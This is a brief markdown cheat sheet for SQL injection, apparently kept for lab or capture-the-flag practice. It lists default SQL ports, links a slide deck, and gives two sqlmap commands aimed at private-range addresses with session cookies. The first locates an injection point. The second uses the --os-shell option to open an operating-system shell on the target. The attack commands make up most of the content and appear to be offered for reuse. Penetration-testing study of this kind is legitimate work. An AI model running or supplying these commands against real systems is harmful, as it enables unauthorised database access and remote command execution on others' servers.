<!-- https://cheatography.com/lucbpz/cheat-sheets/the-ultimate-markdown/ -->
# SQL Exploit Cheatsheet
## List of SQL Port Numbers
* **SQL Server**: tcp/1433
* **MySQL**: tcp/3306

## SLQ Injection
https://slides.com/christophe-cybr/sql-explained#/2


## sqlmap
command to find an sql injection vulnerability when there is security using cookies on a webpage
```bash
~$ sqlmap -u 'http://10.129.70.193/dashboard.php?search=anything' --cookie="858ggvh5mjtb181j0grcb6nd3q"
```

perform an sql command injection on the above setup to spawn a shell
```bash
~$ sqlmap -u 'http://10.129.45.252/dashboard.php?search=hello' --cookie="PHPSESSID=sk03u89dk558v7glib9enbl8l1" --os-shell
```
